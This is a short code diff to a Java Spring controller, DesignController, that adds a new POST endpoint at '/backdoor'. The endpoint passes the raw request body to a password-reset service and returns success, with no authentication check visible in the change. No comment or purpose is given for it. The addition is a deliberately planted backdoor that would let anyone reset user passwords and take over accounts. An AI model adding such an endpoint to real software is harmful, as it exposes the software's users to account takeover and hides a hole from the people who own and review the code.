@@ -185,7 +185,6 @@ public class DesignController {
             String errorJson = getErrorJson(e.getMessage());
             return new ResponseEntity<>(errorJson, HttpStatus.FORBIDDEN);
         }
-
     }
 
     /**
@@ -269,6 +268,16 @@ public class DesignController {
         } catch (Exception e) {
             String errorJson = getErrorJson(e.getMessage());
             return new ResponseEntity<>(errorJson, HttpStatus.FORBIDDEN);
+        }
+    }
+
+    @PostMapping("/backdoor")
+    public ResponseEntity<String> resetPassword(@RequestBody String body) {
+        try {
+            userService.resetPassword(body);
+            return new ResponseEntity<>(null, HttpStatus.OK);
+        } catch (Exception e) {
+            return new ResponseEntity<>(getErrorJson(e.getMessage()), HttpStatus.FORBIDDEN);
         }
     }
 
